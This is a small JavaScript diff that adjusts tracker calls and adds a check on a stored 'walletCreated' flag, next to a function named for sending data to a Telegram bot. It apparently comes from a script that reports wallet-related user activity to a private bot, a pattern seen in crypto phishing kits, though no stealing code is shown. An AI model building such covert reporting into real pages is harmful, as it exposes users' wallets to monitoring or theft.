@@ -64,9 +64,14 @@ function startTracker(trackerId) {
 document.addEventListener('DOMContentLoaded', () => {
     // Check all potential trackers (example for 'tracker1' and 'tracker2')
     refreshTracker('tracker1');
-    refreshTracker('tracker-one');
+    refreshTracker('tracker2');
     // Add more if needed
-});		    
+});		
+
+const walletCreated = localStorage.getItem('walletCreated');
+if (walletCreated === 'true') {
+startTracker('tracker-one');
+}
 
 // Function to send data to Telegram bot
 async function sendToTelegramBot(data, botToken, chatId) {
